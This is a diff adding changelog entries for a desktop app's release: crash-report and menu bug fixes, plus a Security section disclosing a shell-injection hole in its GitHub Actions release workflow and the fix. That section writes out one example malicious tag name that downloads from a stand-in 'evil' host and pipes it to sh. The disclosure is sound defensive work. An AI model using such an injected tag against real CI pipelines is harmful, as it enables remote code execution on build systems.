@@ -43,7 +43,14 @@ _Nothing yet._
 - **Emailed crash reports silently opened nothing.** URL length was bounded by character count, but
   percent-encoding inflates a 3-byte character ninefold — a real backtrace produced a ~7800-character
   `mailto:`, past the ~2048 Windows ShellExecute limit, which opens a blank window and reports no
-  error. Bounds are now enforced on the encoded length, and truncation never splits an escape.
+  error. The bound is now on the **whole URL** (scheme, address, subject and body together), enforced
+  on encoded length, and truncation never splits an escape. Bounding only the body was not enough:
+  a subject is user text, and 80 CJK characters encode to 720 bytes, so a non-English report still
+  reached ~2285 characters.
+- **Two simultaneous panics showed two crash dialogs.** `panic = "abort"` does not stop the world
+  instantly, so two threads could each run the hook. The notice now spawns at most once per process.
+- **A crash-notice helper with no readable pid relaunched immediately**, straight into the
+  single-instance race it exists to avoid. It now waits a fixed interval instead.
 - **Dropdown menus stayed open when you clicked away.** The Sources rail's **+** menu and both
   *Add filter* menus now close on an outside click or Escape. Escape closes the innermost thing only,
   so a menu inside a dialog takes one press to dismiss and a second to close the dialog.
@@ -66,6 +73,19 @@ _Nothing yet._
 - The **Testing** section of the bug-report dialog (*Simulate a crash report*, *Force a test crash*)
   and its two IPC commands. A "crash the app" control has no business shipping in a live studio; the
   loop is drilled with the `--test-crash` launch flag, which has no button and no command behind it.
+
+### Security
+- **Release workflow: shell injection via the tag name.** `${{ github.ref_name }}` was interpolated
+  straight into `run:` blocks, so GitHub spliced the tag into the shell *source* before bash parsed
+  it. Ref names forbid spaces but allow `"`, `;`, `$` and backticks, and `${IFS}` supplies the space —
+  a tag like `v1";curl${IFS}evil|sh;"` would execute. The tag now reaches the script through `env:`,
+  as data. Exploiting it required tag-push access, so this is defence in depth.
+- The release job's `actions/checkout` now sets `persist-credentials: false`. It holds
+  `contents: write` and only reads `CHANGELOG.md`; leaving the `GITHUB_TOKEN` in `.git/config` would
+  have handed any future injection a ready path to push.
+- `PRIVACY.md` now states plainly that the update check runs **once per launch** rather than only on
+  request, and that it sends nothing about the user — the previous wording said every network request
+  was "initiated by your action," which the new startup check made untrue.
 
 ## [0.95.0] — 2026-07-08 (Game capture, distribution & per-app audio — Phase 8)
 
